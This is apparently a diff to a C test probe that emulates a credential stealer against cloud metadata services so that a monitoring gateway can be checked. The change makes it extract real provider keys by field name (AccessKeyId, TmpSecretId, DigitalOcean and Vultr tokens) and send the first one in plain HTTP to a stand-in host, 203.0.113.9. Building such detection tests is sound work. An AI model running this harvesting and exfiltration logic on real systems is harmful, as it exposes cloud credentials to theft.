@@ -11,7 +11,7 @@
  * (MAC, addresses, gateway, DNS), dns.* (the Tencent metadata name), then
  * meta.* for every metadata path tried on every provider's address. Last it
  * does what a credential stealer does with what it found: sends the first
- * canary-looking credential in a plain HTTP request to 203.0.113.9, so the
+ * credential in a plain HTTP request to 203.0.113.9, so the
  * gateway can see the use. "STEALTH-END" ends the output (the run driver
  * waits for it).
  *
@@ -110,27 +110,38 @@ static const char *body_of(const char *response)
 	return at ? at + 4 : response;
 }
 
-/* Remember the token around "ANTCANARY", as a stealer would copy a key. */
+/* Copy the first key a stealer looks for: the value after a credential field
+ * of a provider's metadata answer or user data. The canary carries no marker,
+ * so the probe finds it the way a sample would, by the field's name. */
 static void find_canary(const char *body)
 {
-	const char *at = strcasestr(body, "ANTCANARY");
-	const char *s, *e;
+	static const char *const fields[] = {
+		"\"TmpSecretId\"", "\"AccessKeyId\"",
+		"DIGITALOCEAN_ACCESS_TOKEN=", "VULTR_API_KEY=",
+	};
+	size_t i, n;
 
-	if (!at || canary[0])
+	if (canary[0])
 		return;
-	at = at ? at : body;
-	s = at;
-	while (s > body && (s[-1] == '.' || s[-1] == '_' || s[-1] == '-' ||
-			    (s[-1] >= '0' && s[-1] <= '9') || (s[-1] >= 'A' && s[-1] <= 'Z') ||
-			    (s[-1] >= 'a' && s[-1] <= 'z')))
-		s--;
-	e = at;
-	while (*e == '.' || *e == '_' || *e == '-' || (*e >= '0' && *e <= '9') ||
-	       (*e >= 'A' && *e <= 'Z') || (*e >= 'a' && *e <= 'z'))
-		e++;
-	if ((size_t)(e - s) < sizeof(canary)) {
-		memcpy(canary, s, (size_t)(e - s));
-		canary[e - s] = 0;
+	for (i = 0; i < sizeof(fields) / sizeof(fields[0]); i++) {
+		const char *at = strstr(body, fields[i]);
+
+		if (!at)
+			continue;
+		at += strlen(fields[i]);
+		while (*at == ' ' || *at == ':' || *at == '"')
+			at++;
+		for (n = 0; n + 1 < sizeof(canary) &&
+			    (at[n] == '.' || at[n] == '_' || at[n] == '-' ||
+			     (at[n] >= '0' && at[n] <= '9') || (at[n] >= 'A' && at[n] <= 'Z') ||
+			     (at[n] >= 'a' && at[n] <= 'z'));
+		     n++)
+			;
+		if (n) {
+			memcpy(canary, at, n);
+			canary[n] = 0;
+			return;
+		}
 	}
 }
 
